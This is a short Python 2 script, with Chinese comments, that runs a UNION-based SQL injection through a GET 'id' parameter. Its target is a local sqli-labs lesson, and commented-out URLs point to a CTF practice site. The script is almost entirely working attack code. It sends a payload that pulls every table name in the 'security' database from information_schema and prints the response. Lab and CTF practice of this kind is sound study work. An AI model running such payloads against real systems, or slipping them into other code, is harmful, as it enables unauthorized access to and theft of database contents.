# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://ctf5.shiyanbar.com/web/index_3.php?id=' #简单sql注入2
url='http://localhost/sqli-labs/Less-1/?id=' #lesson 1
database='security'
payload_table_from_tab="-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='"+database+"'" #从information_schema.tables中获取数据库所有表名

payload_end='--+' #mysql终结符
try:
    req = urllib2.Request(url + quote(payload_table_from_tab)+payload_end)
    print 'req is already: ' + url + quote(payload_table_from_tab)+payload_end
    res = urllib2.urlopen(req,data=None,timeout=2)
    # print 'res is already '
    text=res.read()
except Exception ,e:
    print "Error: "+e
print text
